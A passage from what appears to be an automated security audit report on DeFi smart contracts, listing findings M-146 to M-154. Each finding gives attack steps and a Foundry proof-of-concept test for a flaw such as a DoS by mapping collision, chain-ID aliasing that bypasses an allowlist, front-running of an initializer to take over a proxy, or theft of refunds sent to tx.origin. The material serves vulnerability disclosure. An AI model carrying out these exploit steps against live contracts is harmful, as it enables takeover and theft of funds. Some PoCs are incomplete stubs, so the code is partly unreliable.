```md
## [M-146]. DoS in IdentityRegistryBridger via shared Service Multisig collision

## id: h5_fqio9-fdFJh51tocCq

## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
IdentityRegistryBridger.updateOrLinkServiceIdAgentIds

## Finding Status: LowSeverityDueToRareLikelihood + InvalidFutureSpeculation
### Finding Status Justification: The bridger enforces a 1:1 mapping `mapMultisigAgentIds[multisig] = agentId` in `_register` and `_updateAgentWallet` with no collision checks. If two different services can ever resolve to the same `multisig` (whether via registry flexibility, reuse of an existing Safe, or other deployment mechanics), calling `updateOrLinkServiceIdAgentIds` for the later service will overwrite the mapping and cause `validationRequest` from that multisig to revert for the other agentId (`WrongAgentId`). The overwrite behavior is present in code; however, the ability to create two services sharing the same multisig is not verifiable from the provided ServiceRegistry snippet alone, so real-world exploitability is conditional (hence rare / partially speculative).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `IdentityRegistryBridger` contract maintains a mapping `mapMultisigAgentIds` which links a service's multisig address to its Agent ID (identity). This logic presumes a strictly one-to-one relationship between multisigs and services. However, the `ServiceRegistry` (by design or via flexible `deploy` implementations) does not strictly enforce that a multisig address is unique to a single service. An attacker can deploy a new service (e.g. Service B) configured to use the same multisig address as an existing victim service (Service A). 

By calling `updateOrLinkServiceIdAgentIds` for Service B, the attacker triggers the Bridger to update `mapMultisigAgentIds[multisig]` to point to Service B's Agent ID, overwriting the entry for Service A. Consequently, when the legitimate Service A (via its multisig) calls `validationRequest`, the check `if (agentId != checkAgentId)` fails because `checkAgentId` now returns Service B's Agent ID. This results in a Denial of Service for Service A's validation operations. This state can be toggled back and forth, effectively allowing an attacker to grief the victim persistently.

## Impact
Legitimate services can be prevented from performing validation requests (essential for rewards/tasks) by an attacker who registers a colliding service.

## Command to Run Test


## Proof of Concept
1. Victim has Service A (id 1) with Multisig M. `IdentityRegistryBridger` is linked: `mapMultisigAgentIds[M] == AgentA`.
2. Attacker deploys Service B (id 2) and maliciously configures it (via a custom deployment implementation in `ServiceRegistry` or by reusing a creator) to use the same Multisig M.
3. Attacker calls `updateOrLinkServiceIdAgentIds([2])`.
4. `IdentityRegistryBridger` updates `mapMultisigAgentIds[M] = AgentB`.
5. Victim attempts to call `validationRequest(..., AgentA, ...)` from Multisig M.
6. The contract looks up `mapMultisigAgentIds[M]` which is now `AgentB`.
7. The check `AgentA != AgentB` causes a revert (`WrongAgentId`).

## Proof of Code
contract VulnerabilityTest is Test {
    IdentityRegistryBridger bridger;
    address mockServiceRegistry;
    address mockIdentityRegistry;
    address mockValidationRegistry;
    address mockReputationRegistry;

    function setUp() public {
        mockServiceRegistry = makeAddr("ServiceRegistry");
        mockIdentityRegistry = makeAddr("IdentityRegistry");
        mockValidationRegistry = makeAddr("ValidationRegistry");
        mockReputationRegistry = makeAddr("ReputationRegistry");
        
        bridger = new IdentityRegistryBridger(
            mockIdentityRegistry,
            mockReputationRegistry,
            mockValidationRegistry,
            mockServiceRegistry
        );
        bridger.initialize();
    }

    function test_DoS_Collision() public {
        address sharedMultisig = address(0x123);
        uint256 serviceA = 1;
        uint256 serviceB = 2;
        uint256 agentA = 101;
        uint256 agentB = 102;

        // Mock ServiceRegistry responses
        vm.mockCall(mockServiceRegistry, abi.encodeWithSelector(IServiceRegistry.totalSupply.selector), abi.encode(10));
        
        // Setup Service A
        vm.mockCall(mockServiceRegistry, abi.encodeWithSelector(IServiceRegistry.mapServices.selector, serviceA), abi.encode(0, sharedMultisig, bytes32(0), 0, 0, 0, 0));
        vm.mockCall(mockServiceRegistry, abi.encodeWithSelector(IERC721.tokenURI.selector, serviceA), abi.encode("uriA"));

        // Setup Service B (Colliding Multisig)
        vm.mockCall(mockServiceRegistry, abi.encodeWithSelector(IServiceRegistry.mapServices.selector, serviceB), abi.encode(0, sharedMultisig, bytes32(0), 0, 0, 0, 0));
        vm.mockCall(mockServiceRegistry, abi.encodeWithSelector(IERC721.tokenURI.selector, serviceB), abi.encode("uriB"));

        // Mock IdentityRegistry registration
        vm.mockCall(mockIdentityRegistry, abi.encodeWithSelector(IIdentityRegistry.register.selector, "uriA", new IIdentityRegistry.MetadataEntry[](0)), abi.encode(agentA));
        vm.mockCall(mockIdentityRegistry, abi.encodeWithSelector(IIdentityRegistry.register.selector, "uriB", new IIdentityRegistry.MetadataEntry[](0)), abi.encode(agentB));

        // 1. Link Service A
        uint256[] memory idsA = new uint256[](1); idsA[0] = serviceA;
        bridger.updateOrLinkServiceIdAgentIds(idsA);

        // Verify A is working
        vm.prank(sharedMultisig);
        // Should succeed (mock call to validation registry needed)
        vm.mockCall(mockValidationRegistry, abi.encodeWithSelector(IValidationRegistry.validationRequest.selector), "");
        bridger.validationRequest(address(0), agentA, "", bytes32(0));

        // 2. Attacker Links Service B (Collision)
        uint256[] memory idsB = new uint256[](1); idsB[0] = serviceB;
        bridger.updateOrLinkServiceIdAgentIds(idsB);

        // 3. Verify A is DoS'd
        vm.prank(sharedMultisig);
        vm.expectRevert(abi.encodeWithSelector(WrongAgentId.selector, agentA));
        bridger.validationRequest(address(0), agentA, "", bytes32(0));
    }
}

## Suggested Mitigation
In `_register` and `_updateAgentWallet`, check if `mapMultisigAgentIds[newMultisig]` is already set. If it is non-zero and does not equal the current `agentId`, revert the transaction to prevent overwriting an existing service link.
```

```md
## Finding Status: LowSeverityDueToRareLikelihood + InvalidFutureSpeculation
### Finding Status Justification: `chainId << 192` will indeed alias chainIds modulo 2^64 (no bounds check), so if the system were ever to rely on a chainId > 2^64-1 (or a colliding chain), the allowlist domain separation can be bypassed. The issue is mainly future/low-likelihood, not inherently non-exploitable.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_verifyData` function (inherited by `ProcessBridgedDataOptimism` from `VerifyData`) packs the target address, function selector, and chain ID into a single `uint256` key for allowlist verification. The packing logic performs `targetSelectorChainId |= chainId << 192;`. Since `chainId` is provided as a `uint256` argument, this left-shift operation implicitly truncates the `chainId` to its lowest 64 bits (discarding bits 64-255). 

This creates a collision where any Chain ID `X` and `X + k * 2^64` map to the same allowlist key. If the protocol is ever deployed on a chain with a large ID (or a malicious/testnet chain with such an ID is connected), an attacker can replay a payload authorized for Chain `X` on Chain `X + 2^64` (or vice versa), bypassing the intended chain-separation constraints of the GuardCM allowlist.

## Impact
An attacker can bypass authorization controls and execute privileged cross-chain actions on an unauthorized chain if its ID collides with an authorized chain ID (modulo 2^64).

## Command to Run Test


## Proof of Concept
1. Assume the GuardCM allowlist authorizes a specific target and selector on Chain ID 1 (Ethereum Mainnet). 
2. An attacker (or malicious proposer) constructs a payload for Chain ID `1 + 2^64` (approx. 1.84e19).
3. They call `processBridgeData(..., chainId = 1 + 2^64)`.
4. Inside `_verifyData`, the calculation `(1 + 2^64) << 192` overflows `uint256`, resulting in `1 << 192`.
5. The derived key matches the allowlisted key for Chain ID 1.
6. The verification passes, potentially allowing the payload to be bridged to the unintended chain.

## Proof of Code
pragma solidity ^0.8.30;
import "forge-std/Test.sol";
import {VerifyData} from "contracts/multisigs/VerifyData.sol";

contract VerifyDataTest is VerifyData, Test {
    function testChainIdTruncation() public {
        address target = address(0x123);
        bytes4 selector = 0xabcdef12;
        uint256 chainIdA = 1;
        uint256 chainIdB = 1 + (1 << 64);

        // Authorize Chain A
        uint256 keyA = uint256(uint160(target)) | (uint256(uint32(selector)) << 160) | (chainIdA << 192);
        mapAllowedTargetSelectorChainIds[keyA] = true;

        // Verify Chain A works
        _verifyData(target, abi.encodePacked(selector), chainIdA);

        // Verify Chain B (which should NOT be authorized) also works due to truncation
        // This call should revert with NotAuthorized if secure, but it passes.
        _verifyData(target, abi.encodePacked(selector), chainIdB);
    }
}

## Suggested Mitigation
Add a check to ensure `chainId` fits within 64 bits before packing: `require(chainId <= type(uint64).max, "Chain ID too large");`.
```

### M-148 / `1-egLP6XNokIUBaTSrN8y`
- Finding title: State Corruption due to Unchecked Return Value in `update`
- Report lines: 11929-11980
```md
## [M-148]. State Corruption due to Unchecked Return Value in `update`

## id: 1-egLP6XNokIUBaTSrN8y

## Derived From Pattern/Invariant
UncheckedReturn

## Exploit Type
UncheckedReturn

## Location
ServiceManager.update

## Finding Status: LowSeverityDueToRareLikelihood + InvalidFutureSpeculation
### Finding Status Justification: If `ServiceRegistry.update()` can return `false` without reverting (which is plausible given it returns `bool`), `ServiceManager` will still call `resetServiceToken()` / `createWithToken()`, creating real state desynchronization; that is an exploitable inconsistent-state condition, not inherently non-exploitable.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `ServiceManager.update`, the contract calls `IService(serviceRegistry).update(...)` which returns a boolean `success`. The contract assigns this return value but fails to check if it is `true` before proceeding to call `IServiceTokenUtility(...).createWithToken` or `resetServiceToken`. If `ServiceRegistry.update` returns `false` (indicating failure) instead of reverting, `ServiceManager` will erroneously update the `TokenUtility` state. This results in a critical mismatch where the Token Utility believes the service configuration (tokens/bonds) has changed, while the Service Registry retains the old configuration.

## Impact
Inconsistent system state leading to incorrect bond requirements or token handling. If the registry rejects an update but the utility accepts it, users may deposit wrong bonds or funds may be mishandled.

## Command to Run Test


## Proof of Concept
1. Caller calls `ServiceManager.update` with invalid params that cause `ServiceRegistry` to return `false` (assuming implementation does not revert).
2. `ServiceManager` ignores the `false` return.
3. `ServiceManager` calls `TokenUtility.createWithToken` with new params.
4. `TokenUtility` updates state.
5. Result: Registry has old config, Utility has new config.

## Proof of Code
function testUncheckedReturn() public {
    // Mock ServiceRegistry to return false
    mockRegistry.setUpdateReturn(false);
    
    // Call update
    serviceManager.update(token, hash, ids, params, threshold, serviceId);
    
    // Assert TokenUtility called despite Registry failure
    assertTrue(mockTokenUtility.wasCalled());
}

## Suggested Mitigation
Require `success` to be true: `require(success, "Update failed");` or ensure `ServiceRegistry` always reverts on failure.
```

### M-149 / `4Amv1eHbJjC5SSRe8mlJw`
- Finding title: Chain ID truncation allows authorization bypass via ID collision in VerifyData
- Report lines: 11981-12051
```md
## [M-149]. Chain ID truncation allows authorization bypass via ID collision in VerifyData

## id: 4Amv1eHbJjC5SSRe8mlJw

## Derived From Pattern/Invariant
Authorization Bypass via Chain ID Aliasing

## Exploit Type
AuthByPass

## Location
VerifyData._verifyData

## Finding Status: LowSeverityDueToRareLikelihood + InvalidFutureSpeculation
### Finding Status Justification: Same as finding vC_IEKDW1hURG2WRpPydn: modulo-2^64 aliasing is a real authorization-bypass condition if a colliding >2^64 chainId is ever relevant. It’s unlikely/future-facing, but not inherently non-exploitable.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `VerifyData._verifyData`, the `chainId` is packed into the `targetSelectorChainId` key by shifting it left by 192 bits: `targetSelectorChainId |= chainId << 192`. The `chainId` input is a `uint256`, but only the lowest 64 bits are preserved in the key due to the 256-bit width of the variable. This creates a collision where any `chainId` values congruent modulo `2^64` produce the same key. 

If the protocol authorizes a target/selector on a specific chain (e.g., Chain ID `1`), an attacker can craft a governance proposal destined for a different chain with ID `1 + 2^64` (or any aliasing ID). The verification check `mapAllowedTargetSelectorChainIds[key]` will pass because the key collides with the authorized one, effectively bypassing the allowlist for the unauthorized chain.

## Impact
An unauthorized chain with an ID colliding with an authorized chain ID can execute governance actions, bypassing the intended cross-chain security policy.

## Command to Run Test


## Proof of Concept
1. Admin authorizes a target on Chain ID 10.
2. Attacker submits a bridged payload destined for Chain ID `10 + 2^64`.
3. The `GuardCM` calls `processBridgeData(..., chainId=10 + 2^64)`.
4. `_verifyData` calculates the key using `(10 + 2^64) << 192`. Due to overflow, this equals `10 << 192`.
5. The map lookup returns `true` (authorized).
6. The payload is approved for the unauthorized chain.

## Proof of Code
contract VerifyDataTest is Test, VerifyData {
    function setUp() public {
        // Authorize target on Chain ID 1
        address target = address(0x123);
        bytes4 selector = bytes4(0xdeadbeef);
        uint256 chainId = 1;
        
        uint256 key = uint256(uint160(target));
        key |= uint256(uint32(selector)) << 160;
        key |= chainId << 192;
        mapAllowedTargetSelectorChainIds[key] = true;
    }

    function testChainIDCollission() public {
        address target = address(0x123);
        bytes memory data = abi.encodePacked(bytes4(0xdeadbeef));
        
        // Authorized chain ID 1 works
        _verifyData(target, data, 1);

        // Unauthorized aliased chain ID (1 + 2^64) also works
        uint256 fakeChainId = 1 + (1 << 64);
        // Should revert with NotAuthorized, but doesn't
        _verifyData(target, data, fakeChainId);
    }
}

## Suggested Mitigation
Ensure `chainId` fits within 64 bits before packing, or use `keccak256(abi.encodePacked(target, selector, chainId))` for the mapping key.
```

```md
## [L-150]. Unchecked return values on ERC20 approve and transfer

## id: bMNl1sIok2vYma1HtUSBk

## Derived From Pattern/Invariant
UncheckedERC20Return

## Exploit Type
UncheckedERC20Return

## Location
BuyBackBurner.buyBack

## Finding Status: LowSeverityDueToRareLikelihood + InvalidFutureSpeculation
### Finding Status Justification: There is no explicit safeguard (return values are ignored). While `approve(false)` often leads to a later revert, it is not guaranteed as a safety mechanism, and `transfer(false)` can complete silently with misleading events and leave funds unmoved; if such a token is used/received, the impact can be material (potentially stuck funds until upgrade), not inherently low.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The contract ignores the return value of `IERC20(secondToken).approve` in `_performSwap` and `IERC20(olas).transfer` in `buyBack`. While `approve` failing usually reverts the subsequent swap, a `transfer` returning `false` (e.g., for tokens like EURS or ZRX) will be ignored. This leads to the contract emitting a `TokenTransferred` event and unlocking reentrancy guards even though funds were not actually sent to the `bridge2Burner`.

## Impact
Discrepancy between on-chain events and actual token balances. If the transfer fails silently, the automation layer assumes success, but funds remain in the contract.

## Command to Run Test


## Proof of Concept
1. Setup a token that returns `false` on transfer failure instead of reverting.
2. Trigger a condition where transfer fails (e.g. paused).
3. Call `buyBack`. The function succeeds, emits `TokenTransferred`, but tokens are still in `BuyBackBurner`.

## Proof of Code
function testUncheckedReturn() public { 
    // Mock token returning false on transfer
    vm.prank(user);
    buyBackBurner.buyBack(address(falseReturnToken), 100);
    // Assert success but balance unchanged
}

## Suggested Mitigation
Use `SafeERC20` / `SafeTransferLib` to ensure all ERC20 operations verify the return value (or lack thereof) correctly.
```

### M-151 / `_c64tvmjfVHo7dQJAZi6S`
- Finding title: Stale Oracle Data in `_buyOLAS` (V2) enables Arbitrage against Protocol
- Report lines: 12098-12203
```md
## [M-151]. Stale Oracle Data in `_buyOLAS` (V2) enables Arbitrage against Protocol

## id: _c64tvmjfVHo7dQJAZi6S

## Derived From Pattern/Invariant
FlashLoanEconomicManipulation

## Exploit Type
Oracle

## Location
BuyBackBurner._buyOLAS

## Finding Status: LowSeverityDueToRareLikelihood + InvalidFutureSpeculation
### Finding Status Justification: V2 _buyOLAS does not call updatePrice(); it only calls validatePrice() and getPrice() twice. If the oracle’s validatePrice/getPrice rely on previously stored TWAP values that are only refreshed via updatePrice(), then a stale TWAP could be exploited (flash-manipulate spot to match stale TWAP, then force buyBack to trade at stale terms). However, whether this is exploitable depends on the specific oracle implementation (not provided here): some oracles compute TWAP on-demand and do not become stale. Therefore the issue is plausible but partially speculative from the provided code alone.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_buyOLAS` function (V2 path) relies on `IOracle(poolOracle).validatePrice(maxSlippage)` to ensure the current spot price is close to the time-weighted average price (TWAP). However, the contract does not call `updatePrice()` before this check. As a result, `validatePrice` compares the current spot price against a potentially stale TWAP. If the market price has moved significantly since the last update, an attacker can manipulate the spot price (via flash loan) to match the stale TWAP. This satisfies the `validatePrice` check and the subsequent `tradePrice` bounds check, forcing the contract to execute the buyback at the stale, unfavorable price.

## Impact
The protocol can be forced to buy back tokens at a stale (manipulated) price significantly different from the real market price, leading to loss of funds (overpaying for OLAS).

## Command to Run Test


## Proof of Concept
1. Oracle TWAP is 100. Market price drops to 50. `updatePrice` is not called, so TWAP remains 100 (stale).
2. Attacker flash loans `secondToken` and buys OLAS in the pool, pushing the Spot Price to 100.
3. Attacker calls `buyBack`.
4. `validatePrice` compares Spot (100) vs Stale TWAP (100). The check passes.
5. Contract executes swap at ~100. The post-swap `tradePrice` check also passes.
6. Attacker profits by selling OLAS back to the pool or back-running the transaction, having forced the protocol to buy at 100 instead of the fair market price of 50.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../../contracts/utils/BuyBackBurner.sol";

contract MockERC20 is IERC20 {
    mapping(address => uint256) public balances;
    function balanceOf(address account) external view returns (uint256) { return balances[account]; }
    function transfer(address to, uint256 amount) external returns (bool) {
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    function mint(address to, uint256 amount) external { balances[to] += amount; }
}

contract MockOracle is IOracle {
    uint256 public price;
    uint256 public spotPrice;
    function setPrice(uint256 _price) external { price = _price; }
    function setSpotPrice(uint256 _spot) external { spotPrice = _spot; }
    function getPrice() external view returns (uint256) { return spotPrice; }
    function validatePrice(uint256) external view returns (bool) { return spotPrice == price; }
    function updatePrice() external returns (bool) { price = spotPrice; return true; }
}

contract ConcreteBuyBackBurner is BuyBackBurner {
    constructor(address _lm, address _b2b, address _tr, address _sr) BuyBackBurner(_lm, _b2b, _tr, _sr) {}
    function _initialize(bytes memory) internal override {}
    function _performSwap(address, uint256 amount, address) internal override returns (uint256) { return amount; }
    function _performSwap(address, uint256, int24) internal override returns (uint256) { return 0; }
    function getV3Pool(address, address[] memory, int24) public pure override returns (address) { return address(0); }
}

contract BuyBackBurnerTest is Test {
    ConcreteBuyBackBurner burner;
    MockERC20 token;
    MockOracle oracle;
    function setUp() public {
        token = new MockERC20();
        oracle = new MockOracle();
        burner = new ConcreteBuyBackBurner(address(1), address(2), address(3), address(4));
        vm.store(address(burner), bytes32(uint256(1)), bytes32(uint256(uint160(address(token))))); // Set OLAS
        vm.store(address(burner), bytes32(uint256(4)), bytes32(uint256(1e17))); // Set maxSlippage
        address[] memory tokens = new address[](1); tokens[0] = address(token);
        address[] memory oracles = new address[](1); oracles[0] = address(oracle);
        vm.prank(burner.owner());
        burner.setV2Oracles(tokens, oracles);
        token.mint(address(burner), 1000 ether);
    }
    function testStaleOracleExploit() public {
        oracle.setPrice(100); // Stale TWAP
        oracle.setSpotPrice(50); // Market Price
        vm.expectRevert("Before swap slippage limit is breached");
        burner.buyBack(address(token), 100 ether); // Fails legitimately
        oracle.setSpotPrice(100); // Manipulate Spot to match Stale
        burner.buyBack(address(token), 100 ether); // Succeeds at bad price
    }
}

## Suggested Mitigation
Call `IOracle(poolOracle).updatePrice()` within `_buyOLAS` (V2) before calling `validatePrice` to ensure the TWAP used for validation is fresh.





Finding Status: InvalidGovernanceRisk
```

### M-152 / `2l9A_V6yl4tnPJz57bTSD`
- Finding title: Front-runnable initialization allows proxy takeover in `IdentityRegistryBridger`
- Report lines: 12204-12277
```md
## [M-152]. Front-runnable initialization allows proxy takeover in `IdentityRegistryBridger`

## id: 2l9A_V6yl4tnPJz57bTSD

## Derived From Pattern/Invariant
UpgradeabilityInitializerSafety

## Exploit Type
AuthByPass

## Location
IdentityRegistryBridger.initialize

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: `IdentityRegistryBridger.initialize()` is `external` and only checks `if (owner != address(0)) revert AlreadyInitialized();` then sets `owner = msg.sender`. There is no deployer-only gate and the implementation does not disable initialization. In a proxy setting where the proxy is deployed without constructor init-data (or init is done in a later tx), any mempool observer can call `initialize()` first and become `owner`, then use `changeImplementation/changeManager/changeOwner`. No in-contract safeguard exists. Exploitability depends on deployment practice (atomic deploy+init mitigates), so this is largely an operational/governance/deployment risk, but the code path is real and can be reproduced on any uninitialized instance.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `IdentityRegistryBridger` contract features an `initialize` function that sets the `owner` state variable to `msg.sender`. This function is guarded only by the check `if (owner != address(0))`. In a standard proxy deployment scenario, the proxy's storage for `owner` is initially zero. Since the function is public and lacks access control restricted to a specific deployer, an attacker can monitor the mempool for the proxy deployment transaction and front-run the `initialize` call.

If successful, the attacker becomes the `owner` of the Bridger contract. This grants them access to privileged functions such as `changeImplementation` (to upgrade the contract logic to a malicious one), `changeManager`, and `changeOwner`.

## Impact
Complete takeover of the contract via the proxy. The attacker can upgrade the implementation to malicious logic, potentially modifying registry state or permanently breaking the bridge.

## Command to Run Test


## Proof of Concept
1. Deployer deploys the proxy pointing to `IdentityRegistryBridger` logic.
2. Deployer sends a transaction to call `initialize()` on the proxy.
3. Attacker sees the transaction in the mempool.
4. Attacker sends a transaction to call `initialize()` on the proxy with a higher gas price.
5. Attacker's transaction executes first. `owner` is set to Attacker.
6. Deployer's transaction reverts with `AlreadyInitialized`.
7. Attacker now owns the contract and calls `changeImplementation` to install malicious logic.

## Proof of Code
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "../contracts/IdentityRegistryBridger.sol";

contract InitTest is Test {
    IdentityRegistryBridger implementation;
    
    function setUp() public {
        // Mock constructor args
        implementation = new IdentityRegistryBridger(address(1), address(1), address(1), address(1));
    }

    function testFrontRunInit() public {
        // Assume 'implementation' is being used via a fresh proxy (storage owner is 0)
        // Attacker calls initialize first
        address attacker = address(0xBAD);
        vm.prank(attacker);
        implementation.initialize();

        assertEq(implementation.owner(), attacker);

        // Legitimate deployer tries to init
        address deployer = address(0xDAD);
        vm.prank(deployer);
        vm.expectRevert(AlreadyInitialized.selector);
        implementation.initialize();
    }
}

## Suggested Mitigation
Ensure deployment and initialization are executed atomically (e.g., using a factory contract or passing initialization data to the proxy constructor). Alternatively, protect `initialize` with a check that `msg.sender` is a pre-defined deployer address or use the `constructor` to initialize immutables and disable initializers on the logic contract.
```

### H-153 / `Eg1bFFHxqIRwbAwdhaKTc`
- Finding title: Permanent Guard bypass via stale liveness check proposal
- Report lines: 12278-12369
```md
## [H-153]. Permanent Guard bypass via stale liveness check proposal

## id: Eg1bFFHxqIRwbAwdhaKTc

## Derived From Pattern/Invariant
MaturityorGatingByPass

## Exploit Type
AuthByPass

## Location
GuardCM.pause

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: After the referenced proposal naturally becomes `Defeated` (which can occur without misconfiguration), the CM can pause forever due to terminal `Defeated` semantics; this is a design/property of the liveness mechanism rather than a pure “mistake”, though it remains a privileged/governance-risk vector under the contest trust model.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `pause` function allows the CM to disable the Guard (`paused = 2`) if a specific governance proposal (`governorCheckProposalId`) is in the `Defeated` state. The intent is to allow the CM to act if governance is inactive (liveness check). However, `ProposalState.Defeated` is a final, non-expiring state in standard Governor implementations. Once the referenced proposal is defeated, the CM can call `pause()` at any arbitrary time in the future, even years later when governance is active.

Once paused (`paused=2`), `checkTransaction` allows `DelegateCall` and disables all checks. This allows the CM signers to permanently bypass security restrictions and potentially hijack the Safe using `DelegateCall`.

## Impact
CM signers can permanently disable the Guard using an old defeated proposal, enabling unauthorized `DelegateCall` to takeover the Safe and drain funds.

## Command to Run Test


## Proof of Concept
1. Timelock sets `governorCheckProposalId` to ID `1`.
2. Proposal `1` is voted on and becomes `Defeated` (or simply expires without quorum).
3. Time passes. Protocol functions normally.
4. Malicious CM signers decide to bypass the Guard.
5. CM calls `GuardCM.pause()`. The Guard checks `IGovernor(governor).state(1)`. It returns `Defeated`.
6. `paused` is set to `2`.
7. CM calls `checkTransaction` with a `DelegateCall` operation (which is normally blocked when `paused=1`).
8. `GuardCM` sees `paused=2` and allows it.
9. CM executes `DelegateCall` to a malicious contract, changing the Safe's storage/modules.

## Proof of Code
import {Test} from "forge-std/Test.sol";
import {GuardCM, ProposalState} from "../contracts/multisigs/GuardCM.sol";
import {Enum} from "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";

interface IGovernor { function state(uint256) external returns (ProposalState); }

contract MockGovernor {
    function state(uint256) external pure returns (ProposalState) {
        return ProposalState.Defeated;
    }
}

contract GuardPauseTest is Test {
    GuardCM guard;
    address timelock = address(0x111);
    address multisig = address(0x222);
    MockGovernor governor;

    function setUp() public {
        governor = new MockGovernor();
        guard = new GuardCM(timelock, multisig, address(governor));
        vm.prank(timelock);
        guard.changeGovernorCheckProposalId(1);
    }

    function testStalePauseExploit() public {
        // 1. CM calls pause (succeeds because proposal is defeated)
        vm.prank(multisig);
        guard.pause();
        
        assertEq(guard.paused(), 2);

        // 2. CM calls DelegateCall (normally forbidden)
        // Should succeed because paused == 2
        vm.prank(multisig);
        guard.checkTransaction(
            address(0xBAD), // random target
            0,
            "",
            Enum.Operation.DelegateCall,
            0, 0, 0, address(0), payable(0), "", address(0)
        );
    }
}

## Suggested Mitigation
The `pause` condition should verify that the proposal was defeated *recently* (e.g., within the last week). This requires updating the `IGovernor` interface to fetch the proposal's deadline and checking `block.timestamp - deadline < MAX_INACTIVITY_WINDOW`. Alternatively, require the Timelock to regularly update a 'liveness' timestamp.
```

### M-154 / `0UvnTbmBPwAGkI_JVHMzz`
- Finding title: ETH refunds sent to `tx.origin` allow theft of `l1Dispenser` funds
- Report lines: 12370-12476
```md
## [M-154]. ETH refunds sent to `tx.origin` allow theft of `l1Dispenser` funds

## id: 0UvnTbmBPwAGkI_JVHMzz

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
WormholeDepositProcessorL1.sendMessage

## Finding Status: InvalidGovernanceRisk
### Finding Status Justification: Code path exists: DefaultDepositProcessorL1.sendMessage/sendMessageBatch (inherited by WormholeDepositProcessorL1) refunds leftovers using tx.origin.call{value:leftovers}("") while restricting msg.sender == l1Dispenser. This is an actual accounting mismatch: the refund recipient is not necessarily the payer/initiator contract. If l1Dispenser is a contract that funds msg.value from its own ETH balance (or is triggered through an EOA/keeper that is not the intended refund recipient), the keeper/tx.origin can repeatedly receive excess refunds.

There is no safeguard preventing this: the call is deliberately low-level and its return value is ignored; no recipient validation is performed. Exploitability depends on realistic operational setup (keepers triggering bridging while l1Dispenser supplies ETH with buffers), hence likelihood “Occasional”. DAO/governance can mitigate by ensuring the EOA always pays exact msg.value (or by operational rules), making it partly a governance/operational risk, but the root cause is in code.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
In `WormholeDepositProcessorL1`, the `sendMessage` and `sendMessageBatch` functions calculate the cost of bridging and refund any leftover `msg.value` to `tx.origin` using `tx.origin.call{value: leftovers}("")`. 

These functions are access-controlled and can only be called by `l1Dispenser`. If `l1Dispenser` is a contract that pays for the transaction (which is expected for a Dispenser distributing rewards), the refund logic mistakenly sends the change to the EOA that initiated the transaction (`tx.origin`), bypassing the `l1Dispenser`. This breaks the accounting invariant that refunds should return to the payer (`msg.sender`). An attacker (e.g., a keeper or user triggering the distribution) can supply a high `gasLimitMessage` or just rely on the `l1Dispenser` sending excess ETH, and pocket the difference.

## Impact
The `l1Dispenser` contract is drained of its ETH dust/leftovers on every bridging transaction, enriching the transaction initiator (keeper) at the protocol's expense.

## Command to Run Test


## Proof of Concept
1. Assume `l1Dispenser` is a contract with ETH balance that calls `sendMessage` on `WormholeDepositProcessorL1` with `value: 1 ether`.
2. Attacker (EOA) calls `l1Dispenser.distribute()` (or equivalent) which triggers the call.
3. The actual bridging cost is 0.1 ether.
4. `leftovers` = 0.9 ether.
5. `WormholeDepositProcessorL1` sends 0.9 ether to `tx.origin` (Attacker).
6. `l1Dispenser` loses 0.9 ether which should have been returned to it.

## Proof of Code
import "forge-std/Test.sol";
import "../contracts/WormholeDepositProcessorL1.sol";

contract MockRelayer {
    function quoteEVMDeliveryPrice(uint16, uint256, uint256) external pure returns (uint256, uint256) {
        return (0.1 ether, 0);
    }
    function sendPayloadToEvm(uint16, address, bytes memory, uint256, uint256) external payable returns (uint64) {
        return 0;
    }
}

contract MockDispenser {
    WormholeDepositProcessorL1 processor;
    constructor(address _proc) { processor = WormholeDepositProcessorL1(_proc); }
    // Allow receiving ETH
    receive() external payable {}
    function triggerSend() external payable {
        // Calls processor with excess ETH
        processor.sendMessage{value: 1 ether}(address(0x1), 100, "", 100);
    }
}

contract RefundTheftTest is Test {
    WormholeDepositProcessorL1 processor;
    MockDispenser dispenser;
    MockRelayer relayer;

    function setUp() public {
        relayer = new MockRelayer();
        // Deploy processor with mocks (shortened args for brevity)
        processor = new WormholeDepositProcessorL1(address(1), address(this), address(1), address(relayer), 1, address(1), 2);
        dispenser = new MockDispenser(address(processor));
        // Hack: set l1Dispenser in processor to our mock
        // In reality we would deploy processor with correct dispenser address. 
        // Here we just use vm.store or redeploy. Let's redeploy properly.
        processor = new WormholeDepositProcessorL1(address(1), address(dispenser), address(1), address(relayer), 1, address(1), 2);
        // Need to set L2 target dispenser to avoid revert
        vm.prank(address(this));
        processor.setL2TargetDispenser(address(0x2));
    }

    function testTheft() public {
        address attacker = address(0xBAD);
        vm.deal(attacker, 1 ether);
        vm.deal(address(dispenser), 10 ether);

        uint256 attackerPre = attacker.balance;
        uint256 dispenserPre = address(dispenser).balance;

        vm.prank(attacker, attacker); // msg.sender = attacker, tx.origin = attacker
        dispenser.triggerSend(); // This sends 1 ETH to processor. Cost is 0.1 ETH.

        // Attacker (tx.origin) should receive 0.9 ETH refund
        // Dispenser pays 1 ETH, effectively loses 1 ETH (0.1 cost + 0.9 stolen)
        
        assertEq(attacker.balance, attackerPre + 0.9 ether);
        assertEq(address(dispenser).balance, dispenserPre - 1 ether);
    }
}

## Suggested Mitigation
